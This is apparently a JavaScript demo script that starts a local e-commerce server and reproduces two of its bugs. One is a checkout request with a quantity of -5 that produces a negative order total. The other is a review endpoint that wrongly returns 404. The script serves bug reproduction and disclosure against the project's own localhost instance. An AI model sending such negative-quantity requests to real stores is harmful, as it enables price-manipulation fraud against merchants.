import app from './app.js';
import mongoose from 'mongoose';
import { connectDB } from './config/db.js';

const PORT = 5005;
const server = app.listen(PORT, async () => {
    await connectDB();
    
    const Product = (await import('./models/product.model.js')).default;
    const dummyProduct = await Product.create({
        name: "Test Laptop",
        price: 1000,
        image: "http://example.com/laptop.png",
        stock: 50
    });
    
    console.log(`\n======================================================`);
    console.log(`DEMO 1: Checkout Negative Quantity Exploit`);
    console.log(`======================================================`);
    console.log(`[ACTION] Adding product to cart: ${dummyProduct.name}`);
    console.log(`[ACTION] Product Price: $1000`);
    console.log(`[ACTION] Sending checkout request with maliciously crafted quantity: -5`);
    
    const checkoutRes = await fetch(`http://localhost:${PORT}/api/checkout`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            items: [
                { _id: dummyProduct._id, quantity: -5 }
            ]
        })
    });
    const checkoutData = await checkoutRes.json();
    console.log("\n[RESULT] Checkout API Response:");
    console.log(JSON.stringify(checkoutData, null, 2));
    if (checkoutData.total < 0) {
        console.log(`\n🚨 VULNERABILITY CONFIRMED: The user just forced a negative order total of $${checkoutData.total}!`);
    }

    console.log(`\n======================================================`);
    console.log(`DEMO 2: Review API 404 Bug`);
    console.log(`======================================================`);
    console.log(`[ACTION] Sending a valid POST request to /api/products/${dummyProduct._id}/reviews`);
    
    const reviewRes = await fetch(`http://localhost:${PORT}/api/products/${dummyProduct._id}/reviews`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            userName: "John Doe",
            rating: 5,
            comment: "Great laptop!"
        })
    });
    const reviewData = await reviewRes.json();
    console.log("\n[RESULT] Review API Response:");
    console.log(JSON.stringify(reviewData, null, 2));
    if (reviewRes.status === 404) {
        console.log(`\n🚨 BUG CONFIRMED: The server returned a 404 even though the product ID is perfectly valid.`);
    }
    
    process.exit(0);
});
